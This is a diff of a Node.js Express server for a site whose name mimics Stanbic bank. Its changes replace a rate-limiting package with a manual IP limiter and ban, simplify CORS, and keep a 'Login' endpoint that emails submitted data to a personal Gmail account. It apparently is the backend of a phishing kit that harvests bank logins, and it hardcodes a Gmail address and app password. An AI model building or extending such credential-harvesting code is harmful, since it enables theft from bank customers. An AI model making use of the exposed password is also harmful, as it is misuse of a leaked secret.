@@ -2,59 +2,26 @@ const express = require("express");
 const app = express();
 const cors = require("cors");
 const nodemailer = require("nodemailer");
-const rateLimit = require("express-rate-limit");
 require("dotenv").config();
-
-// CRITICAL for Vercel — real client IP for rate limiter
-app.set("trust proxy", 1);
 
 // Middleware
 app.use(express.json());
+app.set("trust proxy", 1);
 
-// Allow ALL origins
-// CORS — update to your actual frontend Vercel URL
+// CORS
 app.use(
   cors({
     origin: "https://desk-stanbic-online.vercel.app",
-    methods: ["GET", "POST", "OPTIONS"],
-    allowedHeaders: ["Content-Type"],
-    credentials: true,
   })
 );
-app.options("*", cors());
-app.use(express.json());
+
 const PORT = process.env.PORT || 5000;
 
-// Email credentials — hardcoded so Vercel always has them
-// (dotenv still works for local dev if you have a .env file)
+// Email credentials from .env (with hardcoded fallback for manual hosting)
 const userEmail = process.env.EMAIL_USER || "okoriekennethassetvalue@gmail.com";
 const pass = process.env.EMAIL_PASS || "ognghvvpyfgylalm";
 
-// ── Permanent IP blocklist ────────────────────────────────────────────────────
-const blockedIPs = new Set();
-app.use((req, res, next) => {
-  if (blockedIPs.has(req.ip)) {
-    return res.status(403).json({ success: false, message: "Access denied." });
-  }
-  next();
-});
-
-// ── Rate limiter: 5 POSTs per hour, then block IP forever ────────────────────
-const limiter = rateLimit({
-  windowMs: 60 * 60 * 1000,
-  max: 5,
-  keyGenerator: (req) => req.ip,
-  handler: (req, res) => {
-    blockedIPs.add(req.ip);
-    return res.status(403).json({ success: false, message: "Access denied." });
-  },
-});
-app.use((req, res, next) => {
-  if (req.method === "POST") return limiter(req, res, next);
-  next();
-});
-
-// Reusable transporter
+// Reusable transporter (created once at startup)
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
@@ -62,9 +29,44 @@ const transporter = nodemailer.createTransport({
     pass: pass,
   },
 });
-transporter.verify((error) => {
-  if (error) console.error("❌ Mail transporter error:", error.message);
-  else console.log("✅ Mail transporter ready");
+
+// ─── Manual Rate Limiter (no external package needed) ───
+const blockedIPs = new Set();
+const requestCounts = new Map(); // ip -> { count, resetAt }
+
+const RATE_LIMIT = 5;         // max requests per window
+const WINDOW_MS = 60 * 60 * 1000; // 1 hour
+
+app.use((req, res, next) => {
+  if (req.method !== "POST") return next();
+
+  const ip = req.ip || req.socket.remoteAddress;
+
+  // Permanently blocked
+  if (blockedIPs.has(ip)) {
+    return res
+      .status(403)
+      .json({ success: false, message: "Access denied." });
+  }
+
+  const now = Date.now();
+  let entry = requestCounts.get(ip);
+
+  if (!entry || now > entry.resetAt) {
+    entry = { count: 0, resetAt: now + WINDOW_MS };
+  }
+
+  entry.count++;
+  requestCounts.set(ip, entry);
+
+  if (entry.count > RATE_LIMIT) {
+    blockedIPs.add(ip);
+    return res
+      .status(429)
+      .json({ success: false, message: "Too many requests." });
+  }
+
+  next();
 });
 
 // Helper: send email and respond
@@ -85,9 +87,9 @@ const sendMailAndRespond = (
   });
 };
 
-// ── Health check — fixes "Cannot GET /" ──────────────────────────────────────
+// Health check
 app.get("/", (req, res) => {
-  res.json({ status: "ok", server: "Stanbic API" });
+  res.status(200).json({ status: "ok" });
 });
 
 // ─── ENDPOINT 1: POST / ─── Login
